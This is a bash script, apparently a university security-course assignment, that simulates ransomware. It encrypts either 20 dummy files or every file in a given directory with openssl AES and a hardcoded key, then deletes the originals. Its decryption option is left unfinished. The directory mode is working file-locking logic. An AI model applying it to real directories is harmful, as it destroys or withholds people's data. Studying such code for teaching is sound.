#!/bin/bash

#-------------------------------------------------------------
#                AUTHOR : Zacharopoulos Apostolos            #
#                Ransomware script for assigment 5           #
#                Date   : 1 Dec, 2020                        #
#-------------------------------------------------------------

#  openssl enc -aes-256-cbc -pbkdf2 -iter 10000 -a -in file.txt -out secrets.txt.enc -k 1234
#  openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -a -in secrets.txt.enc -out decrypted.txt -k 1234

#-----------case no arguments were given , print usage
if [ -z "$*" ] || [ $1 == "--help" ] ; then   
   echo -e "\nYou didn't add arguments or asked for help!\n"; 
   echo "Usage: make ransom args=' [option] [value] ' ";
   echo "Create files: -p : path  -c : number of files";
   echo -e "Encrypt files: -e  (for pwd) | -e  [path] (for a given directory)\n"
   exit 1
fi

#-----------------------------------------------------------
if [ $1 == "-e" -a "$#" -le 2 ]; then
    #---------------arg 2 is path -> encrypt everything inside this dir
    if [ "$#" -eq 2 ]; then
        if [ -d "$2" ]; then  
            if [ "$(ls -A $2)" ]; then  # Check if dir is empty
                for file in "$2/"*; do                      
                    if [ ${file: -8} == ".encrypt" ]; then  #if file already encrypted,ignore it
                        continue;
                    fi
                    openssl enc -aes-256-cbc -pbkdf2 -salt -iter 1000 -a -in $file -out "$file".encrypt -k 1234 
                    rm "$file"
                done
            else
                echo -e "\nNo files in this directory!\n"
            fi 
            exit 0
        fi
    fi
    #-----If there were no path given, create some files and encrypt them.
    #-----If encrypt has been done before, clean and repeat the same.
    for n in {1..20}; do
        if [ -f "file$n.txt.encrypt" ]; then
            rm file$n.txt.encrypt
            #continue
        fi
        echo  'dummy content' > file$n.txt
    done

    for n in {1..20}; do
         openssl enc -aes-256-cbc -pbkdf2 -salt -iter 1000 -a -in file$n.txt -out file$n.txt.encrypt -k 1234 
    done

    for n in {1..20}; do
        rm file$n.txt
    done
    
    exit 0

#------------------Create dummy files in a given folder-------------------------
elif [ $1 == "-p" ] && [ "$#" -eq 4 ] && [ $3 == "-c" ]; then #check if args are ok and call C file.
    if [ -d "$2" ] && [[ $4 =~ ^[0-9]+$ ]]; then   # if arg2 = dir && arg4 = integer
        ./ransom_support "$2" $4
    else
        echo  "directory not found or given number is not an integer"
    fi
    exit 0

else    
    echo -e "\nWrong call, use --help as argument for help.\n"
fi
#--------------------------------------------------------------------
#--------------------------------------------------------------------
#-----------Option to decrypt the files (not finished!)--------------
# if [ $1 == "-d" ]; then
#     # for n in {1..20}; do
#     #     openssl enc -d -aes-256-cbc -pbkdf2 -a -iter 1000 -in file$n.txt.encrypt -out file$n.txt -k 1234 
#     # done
#     for n in {1..20}; do
#         rm file$n.txt.encrypt
#     done
    
# fi